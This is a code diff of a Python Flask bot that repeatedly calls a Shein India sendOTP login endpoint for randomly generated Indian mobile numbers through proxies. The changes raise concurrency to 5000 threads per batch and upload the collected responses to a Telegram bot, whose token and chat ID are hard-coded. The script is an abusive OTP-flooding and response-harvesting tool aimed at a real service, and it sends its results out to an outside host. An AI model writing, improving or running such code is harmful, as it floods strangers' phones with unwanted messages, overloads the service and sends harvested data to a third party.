@@ -12,7 +12,7 @@ app = Flask(__name__)
 URL = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
 TELEGRAM_TOKEN = "7765850713:AAHlPOY61yfDEK_9juqC6CilUSBUbUsJNa8"
 TELEGRAM_CHAT_ID = "7177581474"
-OUTPUT_FILE = "bsdk.json"
+OUTPUT_FILE = "bk.json"
 LOCK = threading.Lock()
 
 # Proxy Credentials
@@ -41,24 +41,13 @@ HEADERS = {
     "Accept-Encoding": "gzip"
 }
 
-def send_to_telegram(text=None):
-    """Sends a text message or the JSON file to Telegram."""
-    try:
-        if text:
-            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=10)
-        
-        elif os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 2:
-            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+def send_to_telegram():
+    if os.path.exists(OUTPUT_FILE):
+        tg_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+        try:
             with open(OUTPUT_FILE, "rb") as f:
-                requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": "Batch Results (2,500 requests)"}, files={"document": f}, timeout=15)
-            
-            # Clear file after sending
-            with LOCK:
-                with open(OUTPUT_FILE, "w") as f:
-                    json.dump([], f)
-    except Exception as e:
-        print(f"Telegram Error: {e}")
+                requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=10)
+        except: pass
 
 def random_indian_number():
     start = random.choice([str(i) for i in range(70, 80)] + [str(i) for i in range(90, 100)])
@@ -80,6 +69,7 @@ def make_request():
     number = random_indian_number()
     data = f"mobileNumber={number}"
     try:
+        # Added proxies=PROXIES here
         r = requests.post(URL, headers=HEADERS, data=data, timeout=30, proxies=PROXIES)
         if r.status_code == 200:
             try:
@@ -89,19 +79,18 @@ def make_request():
     except: pass
 
 def run_heavy_load():
-    # Startup Alert
-    send_to_telegram("🚀 Bot Started on Render!\nBatch size: 500\nSending JSON every 5 batches.")
-    
     last_rotation = time.time()
-    batch_count = 0
     
     while True:
+        # Check if 2 minutes (120 seconds) have passed to "rotate"
         if time.time() - last_rotation > 120:
-            print("Proxy rotation period reached.")
+            print("Refreshing proxy connection...")
+            # Note: For many SOCKS proxies, simply re-establishing the session 
+            # triggers the rotation if the provider supports it.
             last_rotation = time.time()
 
         threads = []
-        for _ in range(500):
+        for _ in range(5000):
             t = threading.Thread(target=make_request)
             t.daemon = True
             t.start()
@@ -110,19 +99,12 @@ def run_heavy_load():
         for t in threads:
             t.join()
         
-        batch_count += 1
-        print(f"Batch {batch_count}/5 finished.")
-
-        # Send after 5 batches (2,500 requests)
-        if batch_count >= 5:
-            send_to_telegram()
-            batch_count = 0
-        
-        time.sleep(2)
+        send_to_telegram()
+        time.sleep(1)
 
 @app.route('/')
 def health():
-    return "Bot is running. High-concurrency mode active.", 200
+    return "Bot with Proxy Active", 200
 
 if __name__ == "__main__":
     threading.Thread(target=run_heavy_load, daemon=True).start()
